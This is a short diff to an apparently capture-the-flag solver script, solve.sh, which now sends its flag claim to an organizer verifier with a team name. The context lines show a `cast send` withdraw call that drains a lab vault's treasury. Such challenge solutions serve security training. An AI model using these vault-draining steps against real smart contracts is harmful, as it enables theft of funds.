@@ -3,8 +3,9 @@
 #
 #   ./solve.sh [target] [privateKey]
 #
-# target defaults to http://127.0.0.1:8080. If you omit the key, set PRIVATE_KEY
-# in the environment (generate one with `cast wallet new`).
+# target defaults to http://127.0.0.1:8080. Flags are claimed from the organizer
+# verifier — set VERIFIER (default http://127.0.0.1:9090) and TEAM (default
+# team01). If you omit the key, set PRIVATE_KEY (generate with `cast wallet new`).
 set -euo pipefail
 
 TARGET="${1:-http://127.0.0.1:8080}"
@@ -70,4 +71,4 @@ cast send "$VAULT" "withdraw(uint256)" 150000000000000000000 --private-key "$KEY
 echo "batch: executed (1040 treasury asset drained)"
 
 echo "=== claim ==="
-node claim.mjs "$TARGET" "$KEY"
+node claim.mjs "${VERIFIER:-http://127.0.0.1:9090}" "$KEY" "${TEAM:-team01}"
